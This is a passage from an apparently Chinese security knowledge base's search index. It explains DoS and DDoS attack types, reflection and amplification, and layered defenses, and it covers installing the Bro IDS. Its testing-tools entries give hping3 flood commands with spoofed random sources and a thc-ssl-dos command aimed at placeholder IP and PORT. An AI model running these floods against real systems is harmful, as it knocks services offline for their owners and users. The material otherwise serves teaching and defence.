thc-ssl-dos # \u7f16\u8bd1\u5b89\u88c5 ./configure make make install Thc-SSL-DoS\u4f7f\u7528\u6848\u4f8b thc-ssl-dos -l 500 IP PORT --accept \u62d2\u7edd\u670d\u52a1\u653b\u51fb\u9632\u5fa1 \u672c\u8d28\uff1a\u7f51\u7edc\u5c42\u9762\u7684DDoS\u653b\u51fb\u662f\u65e0\u6cd5\u9632\u5fa1\u7684\uff0c\u80fd\u505a\u7684\u5c31\u662f\u4e0d\u65ad\u4f18\u5316\u81ea\u8eab\u7684\u7f51\u7edc\u67b6\u6784\uff0c\u4ee5\u53ca\u63d0\u5347\u7f51\u7edc\u5e26\u5bbd\u3002 \u589e\u52a0\u94fe\u8def\u5e26\u5bbd ISP/WAN\u5c42 \u7535\u4fe1\u4e91\u5824\u4ea7\u54c1\u63d0\u4f9b\"\u6d41\u91cf\u538b\u5236\"\u548c\"\u8fd1\u6e90\u6e05\u6d17\"\uff1a \u6d41\u91cf\u538b\u5236 \u5206\u65b9\u5411\u7684\u9ed1\u6d1e\u8def\u7531 \u8fd1\u6e90\u6e05\u6d17 CDN/Internet\u5c42 CDN\u672c\u8eab\u4e0d\u662f\u6297DDoS\u4ea7\u54c1\uff0c\u4f46\u662f\u9488\u5bf9Web\u670d\u52a1\u800c\u8a00\uff0cCDN\u53ef\u4ee5\u63d0\u4f9b\u4e00\u5b9a\u7684\u6297D\u6548\u679c\u3002 DC\u5c42 DataCenter\u8fd9\u4e00\u5c42\u7684\u9632\u5fa1\u5c5e\u4e8e\u8fd1\u76ee\u7684\u6e05\u6d17\uff0c\u5728DC\u51fa\u53e3\u7684\u5730\u65b9\u90e8\u7f72ADS\u8bbe\u5907\u3002 OS/APP\u5c42 \u5e94\u7528\u5c42\u9632\u5fa1\u3002 \u53c2\u8003\u8d44\u6599 \u4e94\u6b65\u4e03\u62db\uff0c\u5f00\u542f\u6700\u5f3aDDoS\u653b\u9632\u6218\uff01 DDoS\u653b\u51fb\u65b9\u5f0f\u603b\u7ed3 \u57fa\u4e8eMemcached\u5206\u5e03\u5f0f\u7cfb\u7edfDRDoS\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u6280\u672f\u7814\u7a76 \u6d45\u6790ReDoS\u7684\u539f\u7406\u4e0e\u5b9e\u8df5 \u6d45\u8c08DDoS\u653b\u51fb\u4e0e\u9632\u5fa1","title":"\u62d2\u7edd\u670d\u52a1\u653b\u51fb"},{"location":"infrastructure-security/network-security/cc-dos-ddos/dos-ddos/#_1","text":"DoS\uff08Denial of Service\uff09\uff1a\u62d2\u7edd\u670d\u52a1 \u901a\u8fc7\u5bf9\u4e3b\u673a\u7279\u5b9a\u6f0f\u6d1e\u7684\u5229\u7528\u653b\u51fb\u5bfc\u81f4\u7f51\u7edc\u6808\u5931\u6548\u3001\u7cfb\u7edf\u5954\u6e83\u3001\u4e3b\u673a\u6b7b\u673a\u7b49\u800c\u65e0\u6cd5\u63d0\u4f9b\u6b63\u5e38\u7684\u7f51\u7edc\u670d\u52a1\u529f\u80fd\uff0c\u4ece\u800c\u9020\u6210\u62d2\u7edd\u670d\u52a1\u3002 DDoS\uff08Distributed Denial of Service\uff09\uff1a\u5206\u5e03\u5f0f\u62d2\u7edd\u670d\u52a1 \u901a\u8fc7\u5f88\u591a\"\u50f5\u5c38\u4e3b\u673a\"\u5411\u53d7\u5bb3\u4e3b\u673a\u53d1\u9001\u5927\u91cf\u770b\u4f3c\u6b63\u5e38\u7684\u7f51\u7edc\u5305\uff0c\u4ece\u800c\u9020\u6210\u7f51\u7edc\u963b\u585e\u6216\u670d\u52a1\u5668\u8d44\u6e90\u8017\u5c3d\u800c\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u3002","title":"\u62d2\u7edd\u670d\u52a1\u653b\u51fb"},{"location":"infrastructure-security/network-security/cc-dos-ddos/dos-ddos/#_2","text":"","title":"\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u5206\u7c7b"},{"location":"infrastructure-security/network-security/cc-dos-ddos/dos-ddos/#_3","text":"UDP-Flood \u7531\u4e8eUDP\u534f\u8bae\u662f\u4e00\u79cd\u65e0\u8fde\u63a5\u7684\u670d\u52a1\uff0c\u5728UDPFLOOD\u653b\u51fb\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u53d1\u9001\u5927\u91cf\u4f2a\u9020\u6e90IP\u5730\u5740\u7684\u5c0fUDP\u5305\u3002\u4f46\u662f\uff0c\u7531\u4e8eUDP\u534f\u8bae\u662f\u65e0\u8fde\u63a5\u6027\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u5f00\u4e86\u4e00\u4e2aUDP\u7684\u7aef\u53e3\u63d0\u4f9b\u76f8\u5173\u670d\u52a1\u7684\u8bdd\uff0c\u90a3\u4e48\u5c31\u53ef\u9488\u5bf9\u76f8\u5173\u7684\u670d\u52a1\u8fdb\u884c\u653b\u51fb\u3002-- \u767e\u5ea6\u767e\u79d1 \u9632\u5fa1\u6280\u5de7\uff1a \u6458\u81ea \u767e\u5ea6\u767e\u79d1 \u653b\u51fb\u4e1a\u52a1\u7aef\u53e3\uff1a\u6839\u636e\u8be5\u4e1a\u52a1UDP\u6700\u5927\u5305\u957f\u8bbe\u7f6eUDP\u6700\u5927\u5305\u5927\u5c0f\u4ee5\u8fc7\u6ee4\u5f02\u5e38\u6d41\u91cf\u3002 \u653b\u51fb\u975e\u4e1a\u52a1\u7aef\u53e3\uff1a \u4e00\u4e2a\u662f\u4e22\u5f03\u6240\u6709UDP\u5305\uff0c\u53ef\u80fd\u4f1a\u8bef\u4f24\u6b63\u5e38\u4e1a\u52a1\u3002 \u4e00\u4e2a\u662f\u5efa\u7acbUDP\u8fde\u63a5\u89c4\u5219\uff0c\u8981\u6c42\u6240\u6709\u53bb\u5f80\u8be5\u7aef\u53e3\u7684UDP\u5305\uff0c\u5fc5\u987b\u9996\u5148\u4e0eTCP\u7aef\u53e3\u5efa\u7acbTCP\u8fde\u63a5\uff0c\u9700\u8981\u9632\u706b\u5899\u652f\u6491\u3002 TCP-Flood TCP\u653b\u51fb\u4fd7\u79f0SYN\u6cdb\u6d2a\uff0c\u5229\u7528TCP\u4e09\u6b21\u63e1\u624b\u534f\u8bae\u6765\u653b\u51fb\u8ba1\u7b97\u673a\uff0c\u4e3b\u8981\u662f\u901a\u8fc7\u4f2a\u9020\u5927\u91cfIP\u7684\u534a\u8fde\u63a5\u53bb\u653b\u51fb\u5bf9\u65b9\u7cfb\u7edf\u3002 ICMP-Flood \u6b7b\u4ea1\u4e4bping\uff0c\u6b63\u5e38ICMP\u534f\u8bae\u6570\u636e\u5305\u4e3a96\u5b57\u8282\uff0c\u653b\u51fb\u8005\u4f7f\u7528\u7684ICMPFlood\u901a\u5e38\u8bbe\u5b9a\u8f83\u5927\u7684\u957f\u5ea6\u3002","title":"\u7f51\u7edc\u5c42\u653b\u51fb"},{"location":"infrastructure-security/network-security/cc-dos-ddos/dos-ddos/#_4","text":"TCP/UDP/ICMP\u5206\u7247 \u5f53\u534f\u8bae\u6808\u6536\u5230\u5206\u7247\u901a\u77e5\u65f6\uff0c\u9700\u8981\u9884\u7559\u4e00\u5b9a\u7684\u5185\u5b58\u6765\u7ec4\u88c5\u6570\u636e\u5305\uff0c\u653b\u51fb\u8005\u6076\u610f\u4f7f\u7528\u5206\u7247\u529f\u80fd\u65f6\uff0c\u5c31\u4f1a\u5bfc\u81f4\u670d\u52a1\u7aef\u7684\u534f\u8bae\u6808\u8d44\u6e90\u6d88\u8017\u8fc7\u5927\u3002 SYN-Flood \u6b63\u5e38\u6d41\u7a0b\uff1a\u5ba2\u6237\u7aef\u53d1\u9001SYC\uff0c\u670d\u52a1\u7aef\u54cd\u5e94SYN+ACK\uff0c\u5ba2\u6237\u7aef\u56de\u4f20ACK+1\u3002 \u653b\u51fb\u6d41\u7a0b\uff1a\u4f2a\u9020\u4e0d\u5b58\u5728\u7684IP\u53d1\u9001\u8bf7\u6c42\uff0c\u670d\u52a1\u7aef\u63a5\u53d7\u4e0d\u5230ACK+1\uff0c\u4f1a\u6301\u7eed\u53d1\u9001SYN+ACK\uff0c\u540c\u65f6\u4fdd\u6301\u7740\u672a\u5b8c\u6210\u7684\u8fde\u63a5\uff0c\u8fd9\u6837\u5bb9\u6613\u5360\u6ee1\u670d\u52a1\u5668\u7684\u8fde\u63a5\u961f\u5217\u8fbe\u5230\u6548\u679c\u3002 ACK-Flood \u4e0eSYN-Flood\u653b\u51fb\u7c7b\u4f3c\uff0c\u653b\u51fb\u8005\u53d1\u9001ACK\u5305\uff0c\u5982\u679c\u76ee\u6807\u7cfb\u7edf\u5141\u8bb8ACK\u6765\u5efa\u7acb\u8fde\u63a5\u5c31\u5f88\u5bb9\u6613\u5bfc\u81f4\u8fde\u63a5\u8868\u9879\u8d44\u6e90\u8017\u5c3d\uff0c\u540c\u65f6\u534f\u8bae\u6808\u8fd8\u4f1a\u53d1\u73b0\u8fd9\u7c7b\u6570\u636e\u5305\u4e0d\u5408\u6cd5\u548c\u54cd\u5e94reset\u5305\uff0c\u5bfc\u81f4\u7cfb\u7edf\u8d44\u6e90\u6d88\u8017\u8fc7\u5927\u3002 zeroWindow \u5efa\u7acb\u8fde\u63a5\u540e\uff0c\u53d1\u9001\u6570\u636e\u8bf7\u6c42\uff0c\u670d\u52a1\u7aef\u51c6\u5907\u597d\u6570\u636e\u65f6\uff0c\u653b\u51fb\u8005\u53d1\u9001ack\u5305\u6307\u5b9awindow\u5927\u5c0f\u4e3a0\uff0c\u8fd9\u662f\u670d\u52a1\u7aef\u65e0\u6cd5\u53d1\u9001\u6570\u636e\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\uff0c\u901a\u8fc7\u5efa\u7acb\u5927\u91cf\u8fd9\u6837\u7684\u8fde\u63a5\u6765\u6d88\u8017\u670d\u52a1\u7aef\u8d44\u6e90\u3002 Connection-Flood \u4ec5\u5efa\u7acb\u8fde\u63a5\u4e0d\u53d1\u9001\u6570\u636e\uff0c\u7531\u4e8e\u670d\u52a1\u5668\u7b49\u5f85\u8d85\u65f6\uff0c\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5efa\u7acb\u5927\u91cf\u8fd9\u6837\u7684\u8fde\u63a5\uff0c\u5b9e\u73b0\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002 SSL-Flood \u4e0d\u65ad\u7684\u53d1\u8d77SSL\u63e1\u624b\uff0cSSL\u63e1\u624b\u8fc7\u7a0b\uff0c\u670d\u52a1\u7aef\u6d88\u8017\u7684\u8d44\u6e90\u662f\u5ba2\u6237\u7aef\u768415\u500d\u3002 SSLKeyRenego \u5728\u534f\u5546\u52a0\u5bc6\u7b97\u6cd5\u7684\u65f6\u5019\u670d\u52a1\u7aefCPU\u7684\u6d88\u8017\u662f\u5ba2\u6237\u7aef\u768415\u500d\u5de6\u53f3\uff0c\u800cRenegotiating\u673a\u5236\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u5728\u4e00\u4e2aTCP\u8fde\u63a5\u4e2d\u4e0d\u65ad\u8fdb\u884c\u91cd\u65b0\u534f\u5546\uff0c\u5bfc\u81f4\u670d\u52a1\u7aefCPU\u8d44\u6e90\u8017\u5c3d\u3002 \u9632\u5fa1\u6280\u5de7\uff1a \u7981\u7528Renegotiating\u673a\u5236\u6765\u5b9e\u73b0\u9632\u5fa1","title":"\u534f\u8bae\u5c42\u653b\u51fb"},{"location":"infrastructure-security/network-security/cc-dos-ddos/dos-ddos/#_5","text":"\u53cd\u5c04\uff1a\u65e0\u8bbaDNS\u8fd8\u662fNTP\uff0c\u90fd\u662f\u57fa\u4e8eUDP\u534f\u8bae\u7684\uff0c\u5728UDP\u534f\u8bae\u4e2d\u6b63\u5e38\u5ba2\u6237\u7aef\u53d1\u9001\u8bf7\u6c42\u5305\u5230\u670d\u52a1\u7aef\uff0c\u670d\u52a1\u7aef\u8fd4\u56de\u54cd\u5e94\u5305\u5230\u5ba2\u6237\u7aef\uff0c\u4f46\u662fUDP\u534f\u8bae\u662f\u9762\u5411\u65e0\u8fde\u63a5\u7684\uff0c\u6240\u4ee5\u5ba2\u6237\u7aef\u53d1\u9001\u8bf7\u6c42\u5305\u7684\u6e90IP\u5f88\u5bb9\u6613\u8fdb\u884c\u4f2a\u9020\uff0c\u5f53\u628a\u6e90IP\u4fee\u6539\u4e3a\u53d7\u5bb3\u8005\u7684IP\uff0c\u6700\u7ec8\u670d\u52a1\u7aef\u8fd4\u56de\u7684\u54cd\u5e94\u5305\u5c31\u4f1a\u8fd4\u56de\u5230\u53d7\u5bb3\u8005\u7684IP\uff0c\u8fd9\u6837\u5c31\u5f62\u6210\u4e86\u53cd\u5c04\u653b\u51fb\u3002 \u653e\u5927\uff1a\u4e00\u4e2a\u5c0f\u7684\u8bf7\u6c42\u5305\u6700\u7ec8\u4f1a\u53d7\u5230\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u591a\u4e8e\u8bf7\u6c42\u5305\u8bb8\u591a\u500d\u7684\u54cd\u5e94\u5305\uff0c\u8fd9\u6837\u5c31\u8fbe\u5230\u4e86\u56db\u4e24\u62e8\u5343\u65a4\u7684\u6548\u679c\u3002 DNS\u53cd\u5c04 \u5229\u7528\u4e92\u8054\u7f51\u4e0a\u5f00\u653e\u7684DNS\u5730\u67dc\u670d\u52a1\u5668\u4f5c\u4e3a\u653b\u51fb\u6e90\uff0c\u5229\u7528\"\u53cd\u5f39\"\u624b\u6cd5\u653b\u51fb\u76ee\u6807\u673a\u5668\u3002 \u6b63\u5e38\u6d41\u7a0b\uff1a\u6e90IP\u5730\u5740--DNS\u67e5\u8be2--DNS\u670d\u52a1\u5668--DNS\u56de\u590d\u5305--\u6e90IP\u5730\u5740 \u653b\u51fb\u6d41\u7a0b\uff1a\u4f2a\u9020IP\u5730\u5740(\u53d7\u5bb3\u8005IP)--DNS\u67e5\u8be2--DNS\u670d\u52a1\u5668--DNS\u56de\u590d\u5305--\u4f2a\u9020\u7684IP\u5730\u5740(\u653b\u51fb\u76ee\u6807) NTP\u53cd\u5c04 NTP\u5305\u542b\u4e00\u4e2amonlist\u529f\u80fd\uff0c\u4e5f\u88ab\u79f0\u4e3aMON_GETLIST\uff0c\u4e3b\u8981\u7528\u4e8e\u76d1\u63a7NTP\u670d\u52a1\u5668\uff0cNTP\u670d\u52a1\u5668\u54cd\u5e94monlist\u540e\u6094\u8fd4\u56de\u4e0eNTP\u670d\u52a1\u5668\u8fdb\u884c\u8fc7\u65f6\u95f4\u540c\u6b65\u7684\u6700\u540e600\u4e2a\u5ba2\u6237\u7aefIP\uff0c\u54cd\u5e94\u5305\u6309\u7167\u6bcf6\u4e2aIP\u8fdb\u884c\u5206\u5272\uff0c\u6700\u591a\u6709100\u4e2a\u54cd\u5e94\u5305\u3002 SNMP\u53cd\u5c04 SSDP\u53cd\u5c04 Chargen\u53cd\u5c04","title":"\u53cd\u5c04\u653e\u5927\u653b\u51fb"},{"location":"infrastructure-security/network-security/cc-dos-ddos/dos-ddos/#_6","text":"DRDoS DRDoS\uff08Distributed Reflection Denial of Service\uff09\uff1a\u5206\u5e03\u5f0f\u53cd\u5c04\u653b\u51fb ReDoS ReDoS\uff08Regular Expression Denial of Service\uff09\uff1a\u6b63\u5219\u8868\u8fbe\u5f0f\u62d2\u7edd\u670d\u52a1\u653b\u51fb\uff0c\u5f00\u53d1\u4eba\u5458\u4f7f\u7528\u4e86\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u5bf9\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u8fdb\u884c\u6709\u6548\u6027\u6821\u9a8c\uff0c\u5f53\u7f16\u5199\u6821\u9a8c\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u5b58\u5728\u7f3a\u9677\u6216\u8005\u4e0d\u4e25\u8c28\u65f6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6784\u9020\u7279\u6b8a\u7684\u5b57\u7b26\u4e32\u6765\u5927\u91cf\u6d88\u8017\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u8d44\u6e90\uff0c\u9020\u6210\u670d\u52a1\u5668\u7684\u670d\u52a1\u7ec8\u7aef\u6216\u505c\u6b62\u3002 \u65e0\u7ebfDDoS","title":"\u5176\u5b83\u7c7b\u578b"},{"location":"infrastructure-security/network-security/cc-dos-ddos/dos-ddos/#_7","text":"","title":"\u6d4b\u8bd5\u5de5\u5177"},{"location":"infrastructure-security/network-security/cc-dos-ddos/dos-ddos/#hping3","text":"\u5b98\u7f51\u5730\u5740 Centos7\u7f16\u8bd1\u5b89\u88c5\uff0ckali\u81ea\u5e26 # \u89e3\u51b3\u73af\u5883\u4f9d\u8d56 yum install gcc.x86_64 libpcap-devel.x86_64 tcl-devel -y # \u4e0b\u8f7d wget http://www.hping.org/hping3-20051105.tar.gz # \u89e3\u538b\u5e76\u5f00\u59cb\u7f16\u8bd1 tar -xf hping3-20051105.tar.gz cd hping3-20051105 ./configure # \u62a5\u9519\u5982\u56fe # \u4fee\u6539\u6587\u4ef6\uff0c\u4fee\u6539\u5185\u5bb9\u5982\u56fe vim bytesex.h # \u7f16\u8bd1\u5b8c\u6210\uff0c\u8fdb\u884c\u5b89\u88c5 make # \u62a5\u9519\u5982\u56fe # \u94fe\u63a5\u6587\u4ef6 ln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h # \u518d\u6b21\u5b89\u88c5 make make install hping3\u4f7f\u7528\u6848\u4f8b # \u6d4b\u8bd5SYN Flood hping3 -S --flood -V -p PORT IP hping3 -c 20000 -d 120 -S -w 64 -p PORT --flood --rand-source IP # \u968f\u673a\u6e90IP # \u6d4b\u8bd5UDP Flood hping3 --flood --rand-source --udp -p PORT IP # \u6d4b\u8bd5TCP FIN Flood hping3 --flood --rand-source -F -p PORT IP # \u6d4b\u8bd5TCP RST Flood hping3 --flood --rand-source -R -p PORT IP # \u6d4b\u8bd5PUSH\u548cACK Flood hping3 --flood --rand-source -PA -p PORT IP # \u6d4b\u8bd5ICMP\u548cIGMP Flood hping3 --flood --rand-source -1 -p PORT IP","title":"hping3"},{"location":"infrastructure-security/network-security/cc-dos-ddos/dos-ddos/#thc-ssl-dos","text":"Centos7\u7f16\u8bd1\u5b89\u88c5\uff0ckali\u81ea\u5e26 # \u89e3\u51b3\u73af\u5883\u4f9d\u8d56 yum install gcc.x86_64 openssl-devel.x86_64 -y # \u4e0b\u8f7d git clone git://git.kali.org/packages/thc-ssl-dos.git cd thc-ssl-dos # \u7f16\u8bd1\u5b89\u88c5 ./configure make make install Thc-SSL-DoS\u4f7f\u7528\u6848\u4f8b thc-ssl-dos -l 500 IP PORT --accept","title":"Thc-SSL-DoS"},{"location":"infrastructure-security/network-security/cc-dos-ddos/dos-ddos/#_8","text":"\u672c\u8d28\uff1a\u7f51\u7edc\u5c42\u9762\u7684DDoS\u653b\u51fb\u662f\u65e0\u6cd5\u9632\u5fa1\u7684\uff0c\u80fd\u505a\u7684\u5c31\u662f\u4e0d\u65ad\u4f18\u5316\u81ea\u8eab\u7684\u7f51\u7edc\u67b6\u6784\uff0c\u4ee5\u53ca\u63d0\u5347\u7f51\u7edc\u5e26\u5bbd\u3002","title":"\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u9632\u5fa1"},{"location":"infrastructure-security/network-security/cc-dos-ddos/dos-ddos/#_9","text":"","title":"\u589e\u52a0\u94fe\u8def\u5e26\u5bbd"},{"location":"infrastructure-security/network-security/cc-dos-ddos/dos-ddos/#ispwan","text":"\u7535\u4fe1\u4e91\u5824\u4ea7\u54c1\u63d0\u4f9b\"\u6d41\u91cf\u538b\u5236\"\u548c\"\u8fd1\u6e90\u6e05\u6d17\"\uff1a \u6d41\u91cf\u538b\u5236 \u5206\u65b9\u5411\u7684\u9ed1\u6d1e\u8def\u7531 \u8fd1\u6e90\u6e05\u6d17","title":"ISP/WAN\u5c42"},{"location":"infrastructure-security/network-security/cc-dos-ddos/dos-ddos/#cdninternet","text":"CDN\u672c\u8eab\u4e0d\u662f\u6297DDoS\u4ea7\u54c1\uff0c\u4f46\u662f\u9488\u5bf9Web\u670d\u52a1\u800c\u8a00\uff0cCDN\u53ef\u4ee5\u63d0\u4f9b\u4e00\u5b9a\u7684\u6297D\u6548\u679c\u3002","title":"CDN/Internet\u5c42"},{"location":"infrastructure-security/network-security/cc-dos-ddos/dos-ddos/#dc","text":"DataCenter\u8fd9\u4e00\u5c42\u7684\u9632\u5fa1\u5c5e\u4e8e\u8fd1\u76ee\u7684\u6e05\u6d17\uff0c\u5728DC\u51fa\u53e3\u7684\u5730\u65b9\u90e8\u7f72ADS\u8bbe\u5907\u3002","title":"DC\u5c42"},{"location":"infrastructure-security/network-security/cc-dos-ddos/dos-ddos/#osapp","text":"\u5e94\u7528\u5c42\u9632\u5fa1\u3002","title":"OS/APP\u5c42"},{"location":"infrastructure-security/network-security/cc-dos-ddos/dos-ddos/#_10","text":"\u4e94\u6b65\u4e03\u62db\uff0c\u5f00\u542f\u6700\u5f3aDDoS\u653b\u9632\u6218\uff01 DDoS\u653b\u51fb\u65b9\u5f0f\u603b\u7ed3 \u57fa\u4e8eMemcached\u5206\u5e03\u5f0f\u7cfb\u7edfDRDoS\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u6280\u672f\u7814\u7a76 \u6d45\u6790ReDoS\u7684\u539f\u7406\u4e0e\u5b9e\u8df5 \u6d45\u8c08DDoS\u653b\u51fb\u4e0e\u9632\u5fa1","title":"\u53c2\u8003\u8d44\u6599"},{"location":"infrastructure-security/network-security/ids-ips/bro/","text":"bro \u7f51\u7edc\u5b89\u5168\u76d1\u63a7 \u5b98\u7f51\u5730\u5740 \u5b66\u4e60\u5e73\u53f0 \u5b89\u88c5\u4e0e\u4f7f\u7528 Centos7\u5b89\u88c5Bro \u89e3\u51b3\u4f9d\u8d56 yum install cmake.x86_64 gcc.x86_64 gcc-c++.x86_64 flex.x86_64 bison.x86_64 libpcap.x86_64 libpcap-devel.x86_64 openssl-devel.x86_64 python-devel.x86_64 swig.x86_64 zlib-devel.x86_64 -y yum\u5b89\u88c5 # \u914d\u7f6eyum\u6e90 cd /etc/yum.repos.d/ wget http://download.opensuse.org/repositories/network:bro/CentOS_7/network:bro.repo # \u5b89\u88c5 yum install bro.x86_64 -y # \u914d\u7f6e\u8fd0\u884c\u73af\u5883 vim /etc/profile export PATH=/opt/bro/bin:$PATH source /etc/profile \u7f16\u8bd1\u5b89\u88c5 # \u4e0b\u8f7d(\u63a8\u8350) wget https://www.bro.org/downloads/bro-2.5.5.tar.gz # \u6216\u8005\u901a\u8fc7git\u4e0b\u8f7d git clone --recursive git://git.bro.org/bro # \u5b89\u88c5 tar -xf bro-2.5.5.tar.gz cd bro-2.5.5 ./configure make make install # \u6b64\u65f6\u7684\u5b89\u88c5\u8def\u5f84\u4e3a\uff1a/usr/local/bro Bro\u914d\u7f6e\u6587\u4ef6 # $PREFIX\uff1a\u5b89\u88c5bro\u6240\u5728\u7684\u76ee\u5f55\uff0c\u89c6\u5177\u4f53\u73af\u5883\u6240\u5b9a\u3002 $PREFIX/etc/node.cfg \u76d1\u542c\u7f51\u5361\u6587\u4ef6 $PREFIX/etc/network.cfg \u9ed8\u8ba4\u8bbe\u7f6e $PREFIX/etc/broctl.cfg \u8bbe\u7f6e\u90ae\u7bb1MailTo\uff0c\u5e76\u4e14\u8bbe\u7f6eLogRotationInterval\u6539\u53d8\u65e5\u5fd7\u538b\u7f29\u9891\u7387 Bro\u57fa\u7840\u4f7f\u7528 BroControl # \u914d\u7f6e\u76d1\u542c\u7f51\u5361\uff0c\u6211\u7684\u672c\u5730\u7f51\u5361\u662fens33\uff0c\u4fee\u6539\u5982\u56fe vim /usr/local/bro/etc/node.cfg # \u6267\u884cbroctl # \u67e5\u770b\u65e5\u5fd7 ls -l /usr/local/bro/logs/current/ # \u4f1a\u8bdd\u65e5\u5fd7\uff1aconn.log # \u544a\u8b66\u65e5\u5fd7\uff1a weird.log # \u534f\u8bae\u9519\u8bef notice.log # bro\u811a\u672c\u4ea7\u751f\u7684\u544a\u8b66 # \u534f\u8bae\u89e3\u6790\u65e5\u5fd7\uff1adns.log\u3001files.log\u3001http.log\u3001sip.log\u3001snmp.log Bro Command-Line bro -i ens33 # \u9009\u62e9\u76d1\u542c\u63a5\u53e3\uff0c\u6b64\u65f6\u65e5\u5fd7\u5728\u6267\u884c\u76ee\u5f55\u4e2d bro -r *.pcap # \u8bfb\u53d6\u4e00\u4e2apacp\u8fdb\u884c\u5206\u6790 bro -C # \u7981\u7528\u6821\u9a8c\u548c bro -f # \u6355\u83b7\u6d41\u91cf\u65f6\u8fdb\u884c\u8fc7\u6ee4 bro_cut \u7c7b\u4f3cawk\uff0c\u63d0\u53d6\u6307\u5b9a\u7684\u5217 Bro Scripts Bro+ELK\u5b9e\u73b0\u5165\u4fb5\u68c0\u6d4b\u65e5\u5fd7\u5206\u6790 ELK\u5b89\u88c5\u6587\u6863 \u5206\u6790SSH\u767b\u5f55\u65e5\u5fd7 \u67e5\u770bBro\u4e2dSSH\u7684\u65e5\u5fd7\uff1a cat /usr/local/bro/logs/current/ssh.log \u7f16\u8f91logstash\u914d\u7f6e\u6587\u4ef6\uff1a wget https://raw.githubusercontent.com/fakrul/bro-elk/master/bro-ssh_log.conf # \u4fee\u6539\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84 # \u4fee\u6539es\u5730\u5740\u4e0e\u7d22\u5f15\u540d\u79f0 # \u67e5\u770b\u6548\u679c \u53c2\u8003\u8d44\u6599 \u4f7f\u7528Bro IDS\u548cIntel Critical Stack\u5206\u6790\u7f51\u7edc\u6d3b\u52a8","title":"bro \u7f51\u7edc\u5b89\u5168\u76d1\u63a7"},{"location":"infrastructure-security/network-security/ids-ips/bro/#bro","text":"\u5b98\u7f51\u5730\u5740 \u5b66\u4e60\u5e73\u53f0","title":"bro \u7f51\u7edc\u5b89\u5168\u76d1\u63a7"},{"location":"infrastructure-security/network-security/ids-ips/bro/#_1","text":"","title":"\u5b89\u88c5\u4e0e\u4f7f\u7528"},{"location":"infrastructure-security/network-security/ids-ips/bro/#centos7bro","text":"\u89e3\u51b3\u4f9d\u8d56 yum install cmake.x86_64 gcc.x86_64 gcc-c++.x86_64 flex.x86_64 bison.x86_64 libpcap.x86_64 libpcap-devel.x86_64 openssl-devel.x86_64 python-devel.x86_64 swig.x86_64 zlib-devel.x86_64 -y yum\u5b89\u88c5 # \u914d\u7f6eyum\u6e90 cd /etc/yum.repos.d/ wget http://download.opensuse.org/repositories/network:bro/CentOS_7/network:bro.repo # \u5b89\u88c5 yum install bro.x86_64 -y # \u914d\u7f6e\u8fd0\u884c\u73af\u5883 vim /etc/profile export PATH=/opt/bro/bin:$PATH source /etc/profile \u7f16\u8bd1\u5b89\u88c5 # \u4e0b\u8f7d(\u63a8\u8350) wget https://www.bro.org/downloads/bro-2.5.5.tar.gz # \u6216\u8005\u901a\u8fc7git\u4e0b\u8f7d git clone --recursive git://git.bro.org/bro # \u5b89\u88c5 tar -xf bro-2.5.5.tar.gz cd bro-2.5.5 ./configure make make install # \u6b64\u65f6\u7684\u5b89\u88c5\u8def\u5f84\u4e3a\uff1a/usr/local/bro","title":"Centos7\u5b89\u88c5Bro"},{"location":"infrastructure-security/network-security/ids-ips/bro/#bro_1","text":"# $PREFIX\uff1a\u5b89\u88c5bro\u6240\u5728\u7684\u76ee\u5f55\uff0c\u89c6\u5177\u4f53\u73af\u5883\u6240\u5b9a\u3002 $PREFIX/etc/node.cfg \u76d1\u542c\u7f51\u5361\u6587\u4ef6 $PREFIX/etc/network.cfg \u9ed8\u8ba4\u8bbe\u7f6e $PREFIX/etc/broctl.cfg \u8bbe\u7f6e\u90ae\u7bb1MailTo\uff0c\u5e76\u4e14\u8bbe\u7f6eLogRotationInterval\u6539\u53d8\u65e5\u5fd7\u538b\u7f29\u9891\u7387","title":"Bro\u914d\u7f6e\u6587\u4ef6"},{"location":"infrastructure-security/network-security/ids-ips/bro/#bro_2","text":"BroControl # \u914d\u7f6e\u76d1\u542c\u7f51\u5361\uff0c\u6211\u7684\u672c\u5730\u7f51\u5361\u662fens33\uff0c\u4fee\u6539\u5982\u56fe vim /usr/local/bro/etc/node.cfg # \u6267\u884cbroctl # \u67e5\u770b\u65e5\u5fd7 ls -l /usr/local/bro/logs/current/ # \u4f1a\u8bdd\u65e5\u5fd7\uff1aconn.log # \u544a\u8b66\u65e5\u5fd7\uff1a weird.log # \u534f\u8bae\u9519\u8bef notice.log # bro\u811a\u672c\u4ea7\u751f\u7684\u544a\u8b66 # \u534f\u8bae\u89e3\u6790\u65e5\u5fd7\uff1adns.log\u3001files.log\u3001http.log\u3001sip.log\u3001snmp.log Bro Command-Line bro -i ens33 # \u9009\u62e9\u76d1\u542c\u63a5\u53e3\uff0c\u6b64\u65f6\u65e5\u5fd7\u5728\u6267\u884c\u76ee\u5f55\u4e2d bro -r *.pcap # \u8bfb\u53d6\u4e00\u4e2apacp\u8fdb\u884c\u5206\u6790 bro -C # \u7981\u7528\u6821\u9a8c\u548c bro -f # \u6355\u83b7\u6d41\u91cf\u65f6\u8fdb\u884c\u8fc7\u6ee4 bro_cut \u7c7b\u4f3cawk\uff0c\u63d0\u53d6\u6307\u5b9a\u7684\u5217","title":"Bro\u57fa\u7840\u4f7f\u7528"},{"location":"infrastructure-security/network-security/ids-ips/bro/#bro-scripts","text":"","title":"Bro 